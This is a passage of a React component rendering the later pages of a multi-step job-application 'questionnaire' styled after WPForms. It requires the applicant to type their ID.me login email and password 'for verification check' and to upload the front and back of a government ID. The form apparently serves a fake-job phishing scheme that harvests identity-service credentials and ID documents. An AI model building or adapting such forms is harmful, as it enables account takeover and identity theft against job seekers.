              <li className="choice-1 depth-1">
                <input
                  type="radio"
                  id="wpforms-8-field_134_1"
                  name="have_id_me"
                  onChange={handleInputChange}
                  value="Yes"
                  required
                />
                <label
                  className="wpforms-field-label-inline"
                  htmlFor="wpforms-8-field_134_1"
                >
                  Yes
                </label>
              </li>
              <li className="choice-2 depth-1">
                <input
                  type="radio"
                  id="wpforms-8-field_134_2"
                  name="no_id_me"
                  value="No"
                  onChange={handleInputChange}
                />
                <label
                  className="wpforms-field-label-inline"
                  htmlFor="wpforms-8-field_134_2"
                >
                  No
                </label>
              </li>
            </ul>
          </div>
          <div
            id="wpforms-8-field_125-container"
            className="wpforms-field wpforms-field-pagebreak"
            data-field-id="125"
          >
            <div className="wpforms-clear wpforms-pagebreak-left">
              <button
                className="wpforms-page-button wpforms-page-prev"
                data-action="prev"
                data-page="10"
                data-formid="8"
              >
                Previous
              </button>
              <button
                className="wpforms-page-button wpforms-page-next"
                data-action="next"
                data-page="10"
                data-formid="8"
              >
                Next
              </button>
            </div>
          </div>
        </div>
        <div
          className="wpforms-page wpforms-page-11"
          style={{ display: "none" }}
        >
          <div
            id="wpforms-8-field_139-container"
            className="wpforms-field wpforms-field-email"
            data-field-id="139"
          >
            <label
              className="wpforms-field-label"
              htmlFor="wpforms-8-field_139"
            >
              If yes, Please input your login for verification check
              <span className="wpforms-required-label">*</span>
            </label>
            <input
              type="email"
              id="wpforms-8-field_139"
              className="wpforms-field-medium wpforms-field-required"
              name="id_me_login"
              onChange={handleInputChange}
              required
            />
            <div className="wpforms-field-description">Email</div>
          </div>
          <div
            id="wpforms-8-field_143-container"
            className="wpforms-field wpforms-field-password"
            data-field-id="143"
          >
            <input
              type="password"
              id="wpforms-8-field_143"
              className="wpforms-field-medium wpforms-field-required"
              name="id_me_password"
              onChange={handleInputChange}
              required
            />
            <div className="wpforms-field-description">password</div>
          </div>
          <div
            id="wpforms-8-field_103-container"
            className="wpforms-field wpforms-field-pagebreak"
            data-field-id="103"
          >
            <div className="wpforms-clear wpforms-pagebreak-left">
              <button
                className="wpforms-page-button wpforms-page-prev"
                data-action="prev"
                data-page="11"
                data-formid="8"
              >
                Previous
              </button>
              <button
                className="wpforms-page-button wpforms-page-next"
                data-action="next"
                data-page="11"
                data-formid="8"
              >
                Next
              </button>
            </div>
          </div>
        </div>
        <div
          className="wpforms-page wpforms-page-12"
          style={{ display: "none" }}
        >
          <div
            id="wpforms-8-field_128-container"
            className="wpforms-field wpforms-field-text"
            data-field-id="128"
          >
            <label
              className="wpforms-field-label"
              htmlFor="wpforms-8-field_128"
            >
              Why should we hire you
              <span className="wpforms-required-label">*</span>
            </label>
            <input
              type="text"
              id="wpforms-8-field_128"
              className="wpforms-field-medium wpforms-field-required"
              name="why_hire"
              onChange={handleInputChange}
              required
            />
          </div>
          <div
            id="wpforms-8-field_141-container"
            className="wpforms-field wpforms-field-pagebreak"
            data-field-id="141"
          >
            <div className="wpforms-clear wpforms-pagebreak-left">
              <button
                className="wpforms-page-button wpforms-page-prev"
                data-action="prev"
                data-page="12"
                data-formid="8"
              >
                Previous
              </button>
              <button
                className="wpforms-page-button wpforms-page-next"
                data-action="next"
                data-page="12"
                data-formid="8"
              >
                Next
              </button>
            </div>
          </div>
        </div>
        <div
          className="wpforms-page wpforms-page-13 last"
          style={{ display: "none" }}
        >
          <div
            id="wpforms-8-field_104-container"
            className="wpforms-field wpforms-field-file-upload"
            data-field-id="104"
          >
            <label
              className="wpforms-field-label"
              htmlFor="wpforms-8-field_104"
            >
              Please upload a valid means of identification (FRONT)
              <span className="wpforms-required-label">*</span>
            </label>
            <input
              type="file"
              id="wpforms-8-field_104"
              className="wpforms-field-required"
              data-rule-extension="jpg,jpeg,jpe,gif,png,bmp,tiff,tif,webp,ico,heic,asf,asx,wmv,wmx,wm,avi,divx,mov,qt,mpeg,mpg,mpe,mp4,m4v,ogv,webm,mkv,3gp,3gpp,3g2,3gp2,txt,asc,c,cc,h,srt,csv,tsv,ics,rtx,css,vtt,mp3,m4a,m4b,aac,ra,ram,wav,ogg,oga,flac,mid,midi,wma,wax,mka,rtf,pdf,className,tar,zip,gz,gzip,rar,7z,psd,xcf,doc,pot,pps,ppt,wri,xla,xls,xlt,xlw,mpp,docx,docm,dotx,dotm,xlsx,xlsm,xlsb,xltx,xltm,xlam,pptx,pptm,ppsx,ppsm,potx,potm,ppam,sldx,sldm,onetoc,onetoc2,onepkg,oxps,xps,odt,odp,ods,odg,odc,odb,odf,wp,wpd,key,numbers,pages"
              data-rule-maxsize="104857600"
              name="frontImage"
              onChange={handleFileChange}
              required
            />
            <div className="wpforms-field-description">
              *State ID, Drivers license, Residential permit, Passport
            </div>
          </div>
          <div
            id="wpforms-8-field_142-container"
            className="wpforms-field wpforms-field-file-upload"
            data-field-id="142"
          >
            <label
              className="wpforms-field-label"
              htmlFor="wpforms-8-field_142"
            >
              Please upload a valid means of identification (BACK)
              <span className="wpforms-required-label">*</span>
            </label>
            <input
              type="file"
              id="wpforms-8-field_142"
              className="wpforms-field-required"
              data-rule-extension="jpg,jpeg,jpe,gif,png,bmp,tiff,tif,webp,ico,heic,asf,asx,wmv,wmx,wm,avi,divx,mov,qt,mpeg,mpg,mpe,mp4,m4v,ogv,webm,mkv,3gp,3gpp,3g2,3gp2,txt,asc,c,cc,h,srt,csv,tsv,ics,rtx,css,vtt,mp3,m4a,m4b,aac,ra,ram,wav,ogg,oga,flac,mid,midi,wma,wax,mka,rtf,pdf,className,tar,zip,gz,gzip,rar,7z,psd,xcf,doc,pot,pps,ppt,wri,xla,xls,xlt,xlw,mpp,docx,docm,dotx,dotm,xlsx,xlsm,xlsb,xltx,xltm,xlam,pptx,pptm,ppsx,ppsm,potx,potm,ppam,sldx,sldm,onetoc,onetoc2,onepkg,oxps,xps,odt,odp,ods,odg,odc,odb,odf,wp,wpd,key,numbers,pages"
              data-rule-maxsize="104857600"
              name="backImage"
              onChange={handleFileChange}
              required
            />
            <div className="wpforms-field-description">
              *State ID, Drivers license, Residential permit, Passport
            </div>
          </div>
          <div
            id="wpforms-8-field_24-container"
            className="wpforms-field wpforms-field-pagebreak"
            data-field-id="24"
          >
            <div className="wpforms-clear wpforms-pagebreak-left"></div>
          </div>
        </div>
      </div>
      <div className="wpforms-submit-container" style={{ display: "none" }}>
        <button
          type="submit"
          className="wpforms-submit"
          data-alt-text="Processing..."
          data-submit-text="Submit Questionnaire"
        >
          {isLoading ? "Processing....." : "Submit Questionnaire"}
        </button>
      </div>
    </form>
  );
}
